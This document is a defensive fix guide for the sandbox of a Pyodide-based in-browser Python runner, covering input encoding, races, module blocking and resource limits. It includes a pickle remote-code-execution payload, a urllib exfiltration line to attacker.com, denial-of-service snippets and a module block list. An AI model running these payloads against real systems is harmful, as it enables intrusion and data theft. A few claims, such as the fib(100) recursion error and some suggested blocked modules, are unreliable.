# Compiler Vulnerabilities - Detailed Fix Guide

## VULNERABILITY #1: Unicode Buffer Overflow ⚠️ CRITICAL

### Location
[src/components/execution/worker-bridge.ts](src/components/execution/worker-bridge.ts#L155-L165)

### Current (Buggy) Code
```typescript
sendInput(value: string) {
  if (!this.inputBuffer || !this.inputMetaBuffer) return;

  // ❌ PROBLEM: charCodeAt() returns 16-bit values, not UTF-8 bytes
  const encoded = Array.from(value).map((c) => c.charCodeAt(0));
  const len = Math.min(encoded.length, this.inputBuffer.length - 1);
  for (let i = 0; i < len; i++) {
    Atomics.store(this.inputBuffer, i, encoded[i]);
  }
  Atomics.store(this.inputMetaBuffer, 0, len === 0 ? -1 : len);
  Atomics.notify(this.inputMetaBuffer, 0, 1);
}
```

### Attack Vector
```python
name = input("Enter name: ")  # User types: "Café 😀"
print(f"Hello {name}")
```

**What happens:** 
- 'C' → 67 ✓
- 'a' → 97 ✓  
- 'f' → 102 ✓
- 'é' → 233 (valid Unicode, but Int32Array stores as-is)
- ' ' → 32 ✓
- '😀' → 55357 (WRONG! This is only the first UTF-16 code unit, emoji needs 2 surrogates)

**Result:** Input corrupted, unpredictable behavior

### Fixed Code
```typescript
sendInput(value: string) {
  if (!this.inputBuffer || !this.inputMetaBuffer) return;

  // ✅ FIX: Use TextEncoder for proper UTF-8 encoding
  const encoder = new TextEncoder();
  const encoded = new Uint8Array(encoder.encode(value));
  const len = Math.min(encoded.length, this.inputBuffer.length - 1);
  
  for (let i = 0; i < len; i++) {
    Atomics.store(this.inputBuffer, i, encoded[i]);
  }
  Atomics.store(this.inputMetaBuffer, 0, len === 0 ? 0 : len);  // Also fix -1 bug
  Atomics.notify(this.inputMetaBuffer, 0, 1);
}
```

### Decoder Fix (pyodide-worker.js)
```python
# Also update Python decoder to handle UTF-8:
def _safe_input(prompt=''):
    _js.postMessage(_js.Object.fromEntries(_js.Array.of(
        _js.Array.of('type', 'input_request'),
        _js.Array.of('prompt', str(prompt))
    )))
    _js.Atomics.wait(_js.inputMetaBuffer, 0, 0)
    length = _js.inputMetaBuffer[0]
    # ✅ FIX: Decode as UTF-8, not raw characters
    byte_array = bytes(_js.inputBuffer[i] for i in range(length))
    result = byte_array.decode('utf-8', errors='replace')
    _js.inputMetaBuffer[0] = 0
    return result
```

---

## VULNERABILITY #2: Race Condition in Input Queue ⚠️ CRITICAL

### Location
[public/pyodide-worker.js](public/pyodide-worker.js#L35-L50) + [src/components/execution/worker-bridge.ts](src/components/execution/worker-bridge.ts#L155-L165)

### Issue
Multiple `sendInput()` calls can overwrite the buffer before Python reads it:

```
Main thread: sendInput("Alice")     <- Writes A, l, i, c, e to buffer
Main thread: sendInput("Bob") 3ms   <- Writes B, o, b (overwrites)
Python:      Wakes up after 100ms   <- Reads corrupted: "Bob" or mixed data
```

### Current Code Problems
1. No queue mechanism
2. No handshake to confirm Python has read
3. `inputMetaBuffer[0]` set to length, but Python resets to 0 after reading
4. No guarantee of atomicity

### Fixed Code
Add a simple handshake protocol:

**TypeScript (worker-bridge.ts):**
```typescript
sendInput(value: string) {
  if (!this.inputBuffer || !this.inputMetaBuffer) return;

  const encoder = new TextEncoder();
  const encoded = new Uint8Array(encoder.encode(value));
  const len = Math.min(encoded.length, this.inputBuffer.length - 1);
  
  for (let i = 0; i < len; i++) {
    Atomics.store(this.inputBuffer, i, encoded[i]);
  }
  
  // ✅ Signal Python that input is ready (length > 0)
  Atomics.store(this.inputMetaBuffer, 0, len);
  Atomics.notify(this.inputMetaBuffer, 0);
}
```

**Python (pyodide-worker.js):**
```python
def _safe_input(prompt=''):
    _js.postMessage(_js.Object.fromEntries(...))
    
    # ✅ Wait with timeout (don't wait forever)
    while True:
        length = _js.inputMetaBuffer[0]
        if length > 0:
            break
        # Timeout after 30 seconds
        _js.Atomics.wait(_js.inputMetaBuffer, 0, 0, 30000)
    
    length = _js.inputMetaBuffer[0]
    byte_array = bytes(_js.inputBuffer[i] for i in range(length))
    result = byte_array.decode('utf-8', errors='replace')
    
    # ✅ Signal read complete
    _js.inputMetaBuffer[0] = 0
    _js.Atomics.notify(_js.inputMetaBuffer, 0)
    
    return result
```

---

## VULNERABILITY #3: Spin-Wait Fallback is Broken ⚠️ CRITICAL

### Location
[public/pyodide-worker.js](public/pyodide-worker.js#L44-L54)

### Problem
When SharedArrayBuffer unavailable, fallback uses busy-wait:

```python
def _safe_input(prompt=''):
    _js.postMessage(...)
    # Spin-wait (only used on browsers without SharedArrayBuffer)
    import time
    while _js.inputMetaBuffer[0] == 0:
        time.sleep(0.05)  # ❌ Blocks entire Python thread
    # ...
```

**Issues:**
1. Pyodide on the main thread can't truly block and wait
2. The event loop is blocked → no events processed
3. No way to send input while Python is spinning

### Solution: Remove or Redesign Fallback

**Option A: Require SharedArrayBuffer**
```typescript
// In Compiler.tsx:
useEffect(() => {
  if (typeof SharedArrayBuffer === 'undefined') {
    setOutput([{ 
      text: '❌ This browser does not support SharedArrayBuffer. Use Chrome/Firefox with cross-origin isolation.',
      type: 'error'
    }]);
    return;
  }
  // ... rest of code
}, []);
```

**Option B: Use Callback-Based Input**
```javascript
// More complex redesign: don't use input() at all
// Instead, use callbacks for user interaction
// This requires bigger changes to the preamble
```

**Recommendation:** Go with Option A. Just detect and show user a clear message.

---

## VULNERABILITY #4: stderr Not Truncated (DOS) ⚠️ HIGH

### Location
[public/pyodide-worker.js](public/pyodide-worker.js#L168-L170)

### Current Code
```javascript
try {
  await pyodide.runPythonAsync(fullCode);
  const stdout = truncate(pyodide.globals.get("_stdout_buf").getvalue()); // ✅ Truncated
  const stderr = pyodide.globals.get("_stderr_buf").getvalue();           // ❌ NOT truncated
  self.postMessage({ type: "result", stdout, stderr });
} catch (err) {
  // ...
}
```

### Attack
```python
import sys
# Generate massive error output
for i in range(1000000):
    sys.stderr.write(f"Error {i}: " + "x" * 1000 + "\n")
# Result: 1GB message sent to browser, memory exhaustion
```

### Fixed Code
```javascript
const stdout = truncate(pyodide.globals.get("_stdout_buf").getvalue());
const stderr = truncate(pyodide.globals.get("_stderr_buf").getvalue());  // ✅ Truncate stderr too
self.postMessage({ type: "result", stdout, stderr });
```

---

## VULNERABILITY #5: Incomplete Module Blacklist ⚠️ HIGH

### Location
[public/pyodide-worker.js](public/pyodide-worker.js#L61-L75)

### Missing Dangerous Modules

Current list:
```python
_blocked_modules = frozenset([
    'os', 'subprocess', 'socket', 'shutil', 'importlib',
    'ctypes', 'multiprocessing', '_io', 'pty', 'fcntl',
    'signal', 'resource', 'termios', 'grp', 'pwd',
])
```

**Missing:** pickle, urllib, http, json (with `object_hook`), eval, exec, compile, etc.

### Attack Examples

**Via pickle (Remote Code Execution):**
```python
import pickle
class Evil:
    def __reduce__(self):
        return (__import__('os').system, ('touch /etc/pwned',))
pickle.loads(b"...")  # RCE!
```

**Via importlib (Bypass):**
```python
from importlib.util import spec_from_loader, module_from_spec
# Load arbitrary modules
```

**Via urllib (Exfiltration):**
```python
import urllib.request
urllib.request.urlopen("https://attacker.com/?data=secret")
```

### Fixed Code
```python
_blocked_modules = frozenset([
    # Existing
    'os', 'subprocess', 'socket', 'shutil', 'importlib',
    'ctypes', 'multiprocessing', '_io', 'pty', 'fcntl',
    'signal', 'resource', 'termios', 'grp', 'pwd',
    # ✅ NEW: Add more dangerous modules
    'pickle', 'marshal', 'urllib', 'urllib2', 'urllib3',
    'http', 'httplib', 'requests', 'email',
    'asyncio',  # Can bypass restrictions
    'concurrent', 'threading',  # Worker restriction
    'types',    # Code object creation
    'inspect',  # Frame access
    'gc',       # Memory manipulation
    'traceback',
    'warnings',
    'pkgutil',
    'zipimport',
    'imp',
    'linecache',
    'code',
    'codeop',
    'pydoc',
    'runpy',
    '__main__',
    'builtins',
])

# ✅ ALSO: Add deeper module path checking
def _safe_import(name, *args, **kwargs):
    top = name.split('.')[0]
    if top in _blocked_modules:
        raise ImportError(f"Module '{name}' is not available")
    
    # ✅ NEW: Block submodule imports of dangerous modules
    for blocked in _blocked_modules:
        if name.startswith(blocked + '.'):
            raise ImportError(f"Module '{name}' is not available")
    
    return _real_import(name, *args, **kwargs)
```

---

## VULNERABILITY #6: No Memory Limits ⚠️ HIGH

### Location
[public/pyodide-worker.js](public/pyodide-worker.js#L57)

### Problem
```python
x = [0] * (10**9)  # 40GB allocation
y = {i: [0]*10**6 for i in range(10000)}  # Massive dict
```

Worker crashes with no error message.

### Limitations
Pyodide running in browser can't set hard memory limits. But you can:

**1. Monitor worker memory (imperfect):**
```javascript
// In worker-bridge.ts - add periodic memory check
private monitorMemory() {
  if (typeof performance !== 'undefined' && performance.memory) {
    const used = performance.memory.usedJSHeapSize;
    const limit = 100 * 1024 * 1024;  // 100MB
    if (used > limit) {
      this.terminateWorker();
      this.callbacks.onError("Memory limit exceeded", "error");
      this.spawnWorker();
    }
  }
}
```

**2. Add check in preamble:**
```python
# Check memory periodically during loops
import sys
def _check_memory():
    if hasattr(sys, 'getsizeof'):
        # Rough check - can't be perfect in browser
        pass

# This is weak but better than nothing
```

**Recommendation:** Accept limitation. Document in UI: "Memory limit: ~512MB per execution"

---

## VULNERABILITY #7: Recursion Limit Too Strict ⚠️ MEDIUM

### Location
[public/pyodide-worker.js](public/pyodide-worker.js#L57)

### Issue
```python
_sys.setrecursionlimit(500)
```

Legitimate code fails:
```python
def fib(n):
    if n < 2: return n
    return fib(n-1) + fib(n-2)

fib(100)  # RecursionError: maximum recursion depth exceeded
```

### Fix
```python
_sys.setrecursionlimit(2000)  # More reasonable for educational code
# The 5s timeout is the real safety mechanism
```

---

## VULNERABILITY #8: Input Encoding Edge Case ⚠️ MEDIUM

### Location
[src/components/execution/worker-bridge.ts](src/components/execution/worker-bridge.ts#L162)

### Current Code
```typescript
Atomics.store(this.inputMetaBuffer, 0, len === 0 ? -1 : len);
```

### Problem
Storing `-1` for empty input is misleading. The Python code:
```python
length = _js.inputMetaBuffer[0]
result = ''.join(chr(_js.inputBuffer[i]) for i in range(length))
# range(-1) == empty, so accidentally works
# But: -1 in Atomics operations is confusing
```

### Fix
```typescript
Atomics.store(this.inputMetaBuffer, 0, len);  // Just store length (0 or positive)
```

Also update Python:
```python
while _js.inputMetaBuffer[0] == 0:  # Wait for non-zero
    time.sleep(0.01)
length = _js.inputMetaBuffer[0]
```

---

## VULNERABILITY #9: No Code Size Validation ⚠️ MEDIUM

### Location
[src/components/execution/worker-bridge.ts](src/components/execution/worker-bridge.ts#L120)

### Problem
```typescript
run(code: string) {
  if (!this.worker) return;
  // ❌ No size check - can be 100MB string
  const message: Record<string, unknown> = { type: "run", code };
  this.worker.postMessage(message);
}
```

### Attack
```javascript
// Huge code string
const code = "x = 0\n".repeat(10_000_000);  // 100MB
bridge.run(code);  // Memory exhaustion
```

### Fix
```typescript
run(code: string) {
  if (!this.worker) return;
  
  // ✅ Add code size limit
  const MAX_CODE_SIZE = 1024 * 1024;  // 1MB
  if (code.length > MAX_CODE_SIZE) {
    this.callbacks.onError(
      `Code too large (${Math.round(code.length / 1024)}KB > ${Math.round(MAX_CODE_SIZE / 1024)}KB)`,
      "error"
    );
    return;
  }
  
  // ... rest
}
```

---

## SUMMARY OF FIXES TO APPLY

### Priority 1 (CRITICAL - Apply Immediately)
- [ ] Fix Unicode encoding in `sendInput()` → use TextEncoder
- [ ] Fix input handshake race condition → add acknowledge signal
- [ ] Disable spin-wait fallback → detect SharedArrayBuffer and show error if unavailable
- [ ] Truncate stderr → apply `truncate()` to stderr output

### Priority 2 (HIGH - Apply Soon)
- [ ] Expand module blacklist → add pickle, urllib, etc.
- [ ] Add code size validation → 1MB limit
- [ ] Fix input length encoding → store 0 instead of -1
- [ ] Increase recursion limit → 2000 instead of 500

### Priority 3 (MEDIUM - Cleanup)
- [ ] Add memory monitoring → warn if > 100MB
- [ ] Review OutputPanel → confirm no XSS (already safe, but document)
- [ ] Add input sanitization → length bounds check
- [ ] Document limitations → show to users

---

## TESTING CHECKLIST

After applying fixes, test:

```python
# Test 1: Unicode input
name = input("Enter name: ")  # Type: "José 😀"
print(f"Hello {name}")

# Test 2: Large input
data = input("Paste 1MB text: ")  # Should handle without crash
print(f"Received {len(data)} chars")

# Test 3: Recursion
def recurse(n):
    if n == 0: return "done"
    return recurse(n-1)
print(recurse(1500))  # Should work with 2000 limit

# Test 4: Blocked modules
try:
    import pickle  # Should fail
except ImportError as e:
    print(f"✓ Blocked: {e}")

# Test 5: Large stderr
import sys
for i in range(100):
    sys.stderr.write("x" * 100000)
# Should truncate at 1000 lines

# Test 6: Code size limit
# Send >1MB code → should show error
```
